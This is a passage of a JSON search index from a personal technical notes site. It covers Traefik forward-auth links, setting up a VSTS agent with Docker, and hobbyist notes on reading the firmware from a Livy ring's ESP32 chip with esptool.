7d84adaf-dbed-491c-8ea9-9424cc5a234c</p> <p>https://github.com/thomseddon/traefik-forward-auth/issues/160</p> <p>https://oauth2-proxy.github.io/oauth2-proxy/docs/configuration/overview/#configuring-for-use-with-the-traefik-v2-forwardauth-middleware</p>"},{"location":"random/traefik-keycloak-forward-auth.html#-dont-forget-to-set-created-user-to-be-email-verified","title":"- dont forget to set created user to be email verified","text":"<p>For Azure : https://www.paraesthesia.com/archive/2020/09/03/setting-up-oauth2-proxy-with-istio/</p>"},{"location":"random/vsts-windows-agent-with-docker.html","title":"VSTS Agent with Docker","text":"<ul> <li>Install Docker</li> <li>Create local user account <code>vsts-agent</code></li> <li>Install vsts agent</li> <li>register service with the local user account</li> </ul> <p>https://github.com/docker/for-win/issues/868 - <code>net localgroup docker-users \"vsts-agent\" /ADD</code></p> <p>[1] (https://stackoverflow.com/questions/40078969/docker-for-windows-10-pipe-docker-engine-access-is-denied)</p>"},{"location":"reverse-engineering/livisi.html","title":"livisi-reverse-engineering","text":"","tags":["reverse-engineering","livisi","linux","incomplete"]},{"location":"reverse-engineering/livisi.html#firmware","title":"Firmware","text":"<p>https://www.mikrocontroller.net/topic/285054</p>","tags":["reverse-engineering","livisi","linux","incomplete"]},{"location":"reverse-engineering/livisi.html#network","title":"Network","text":"<p>Connects to shcc.services-smarthome.de</p> <p>Two-way SSL encrypted by Server and Client Certificate.</p>","tags":["reverse-engineering","livisi","linux","incomplete"]},{"location":"reverse-engineering/livy.html","title":"Reverse Engineering the Livy Ring","text":"","tags":["reverse-engineering","livy","linux","incomplete"]},{"location":"reverse-engineering/livy.html#acquire-firmware","title":"Acquire Firmware","text":"<p>https://github.com/DanielHabenicht/reverseengineering.livy</p> <p>PIN Layout:  https://tasmota.github.io/docs/_media/pinouts/ESP-WROOM-32_pinout.jpg</p> <p>Important for Connections: </p> <ul> <li>connect ground of flashing device with ground of livy</li> </ul> <pre><code>PS C:\\Develop&gt; espefuse.py.exe --port COM6 summary\nConnecting......\nDetecting chip type... Unsupported detection protocol, switching and trying again...\nConnecting.......\nDetecting chip type... ESP32\nespefuse.py v3.2\nEFUSE_NAME (Block) Description  = [Meaningful Value] [Readable/Writeable] (Hex Value)\n----------------------------------------------------------------------------------------\nCalibration fuses:\nBLK3_PART_RESERVE (BLOCK0):                        BLOCK3 partially served for ADC calibration data   = False R/W (0b0)\nADC_VREF (BLOCK0):                                 Voltage reference calibration\n     = 1128 R/W (0b00100)\n\nConfig fuses:\nXPD_SDIO_FORCE (BLOCK0):                           Ignore MTDI pin (GPIO12) for VDD_SDIO on reset     = False R/W (0b0)\nXPD_SDIO_REG (BLOCK0):                             If XPD_SDIO_FORCE, enable VDD_SDIO reg on reset    = False R/W (0b0)\nXPD_SDIO_TIEH (BLOCK0):                            If XPD_SDIO_FORCE &amp; XPD_SDIO_REG\n     = 1.8V R/W (0b0)\nCLK8M_FREQ (BLOCK0):                               8MHz clock freq override\n     = 51 R/W (0x33)\nSPI_PAD_CONFIG_CLK (BLOCK0):                       Override SD_CLK pad (GPIO6/SPICLK)\n     = 0 R/W (0b00000)\nSPI_PAD_CONFIG_Q (BLOCK0):                         Override SD_DATA_0 pad (GPIO7/SPIQ)\n     = 0 R/W (0b00000)\nSPI_PAD_CONFIG_D (BLOCK0):                         Override SD_DATA_1 pad (GPIO8/SPID)\n     = 0 R/W (0b00000)\nSPI_PAD_CONFIG_HD (BLOCK0):                        Override SD_DATA_2 pad (GPIO9/SPIHD)\n     = 0 R/W (0b00000)\nSPI_PAD_CONFIG_CS0 (BLOCK0):                       Override SD_CMD pad (GPIO11/SPICS0)\n     = 0 R/W (0b00000)\nDISABLE_SDIO_HOST (BLOCK0):                        Disable SDIO host\n     = False R/W (0b0)\n\nEfuse fuses:\nWR_DIS (BLOCK0):                                   Efuse write disable mask\n     = 0 R/W (0x0000)\nRD_DIS (BLOCK0):                                   Efuse read disable mask\n     = 0 R/W (0x0)\nCODING_SCHEME (BLOCK0):                            Efuse variable block length scheme\n\n   = NONE (BLK1-3 len=256 bits) R/W (0b00)\nKEY_STATUS (BLOCK0):                               Usage of efuse block 3 (reserved)\n     = False R/W (0b0)\n\nIdentity fuses:\nMAC (BLOCK0):                                      Factory MAC Address\n\n   = 80:7d:3a:bc:6c:48 (CRC 0xac OK) R/W\nMAC_CRC (BLOCK0):                                  CRC8 for factory MAC address\n     = 172 R/W (0xac)\nCHIP_VER_REV1 (BLOCK0):                            Silicon Revision 1\n     = True R/W (0b1)\nCHIP_VER_REV2 (BLOCK0):                            Silicon Revision 2\n     = False R/W (0b0)\nCHIP_VERSION (BLOCK0):                             Reserved for future chip versions\n     = 2 R/W (0b10)\nCHIP_PACKAGE (BLOCK0):                             Chip package identifier\n     = 0 R/W (0b000)\nMAC_VERSION (BLOCK3):                              Version of the MAC field\n     = 0 R/W (0x00)\n\nSecurity fuses:\nFLASH_CRYPT_CNT (BLOCK0):                          Flash encryption mode counter\n     = 0 R/W (0b0000000)\nUART_DOWNLOAD_DIS (BLOCK0):                        Disable UART download mode (ESP32 rev3 only)       = False R/W (0b0)\nFLASH_CRYPT_CONFIG (BLOCK0):                       Flash encryption config (key tweak bits)           = 0 R/W (0x0)\nCONSOLE_DEBUG_DISABLE (BLOCK0):                    Disable ROM BASIC interpreter fallback             = True R/W (0b1)\nABS_DONE_0 (BLOCK0):                               Secure boot V1 is enabled for bootloader image     = False R/W (0b0)\nABS_DONE_1 (BLOCK0):                               Secure boot V2 is enabled for bootloader image     = False R/W (0b0)\nJTAG_DISABLE (BLOCK0):                             Disable JTAG\n     = False R/W (0b0)\nDISABLE_DL_ENCRYPT (BLOCK0):                       Disable flash encryption in UART bootloader        = False R/W (0b0)\nDISABLE_DL_DECRYPT (BLOCK0):                       Disable flash decryption in UART bootloader        = False R/W (0b0)\nDISABLE_DL_CACHE (BLOCK0):                         Disable flash cache in UART bootloader             = False R/W (0b0)\nBLOCK1 (BLOCK1):                                   Flash encryption key\n\n   = 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 R/W\nBLOCK2 (BLOCK2):                                   Secure boot key\n\n   = 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 R/W\nBLOCK3 (BLOCK3):                                   Variable Block 3\n\n   = 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 R/W\n\nFlash voltage (VDD_SDIO) determined by GPIO12 on reset (High for 1.8V, Low/NC for 3.3V).\n</code></pre> <p>Get Firmware: </p> <pre><code>PS C:\\Develop&gt; esptool.py.exe --chip esp32 --p COM6 --baud 115200 read_flash 0x0 0x400000 Backupb.bin\nesptool.py v3.2\nSerial port COM6\nConnecting................\nChip is ESP32-D0WDQ6 (revision 1)\nFeatures: WiFi, BT, Dual Core, 240MHz, VRef calibration in efuse, Coding Scheme None\nCrystal is 40MHz\nMAC: 80:7d:3a:bc:6c:48\nUploading stub...\nRunning stub...\nStub running...\n4194304 (100 %)\n4194304 (100 %)\nRead 4194304 bytes at 0x0 in 373.9 seconds (89.8 kbit/s)...\nHard resetting via RTS pin...\n</code></pre>","tags":["reverse-engineering","livy","linux","incomplete"]},{"location":"reverse-engineering/tu-berlin-security-lab.html","title":"TU Berlin Security Lab","text":"<p>Nothing published as the course material might still be reused for the next courses. So you won't find anything on the internet.</p> <p>Internal link: https://github.com/DanielHabenicht/Study.SecurityLab</p>","tags":["reverse-engineering","livy","linux","incomplete"]},{"location":"blog/archive/2021.html","title":"2021","text":""},{"location":"blog/archive/2020.html","title":"2020","text":""},{"location":"blog/archive/2019.html","title":"2019","text":""},{"location":"blog/archive/2018.html","title":"2018","text":""},{"location":"blog/category/hacking.html","title":"Hacking","text":""},{"location":"blog/category/raspberrypi.html","title":"RaspberryPi","text":""},{"location":"blog/category/android.html","title":"Android","text":""},{"location":"blog/category/docker.html","title":"Docker","text":""},{"location":"blog/category/angular.html","title":"Angular","text":""}]}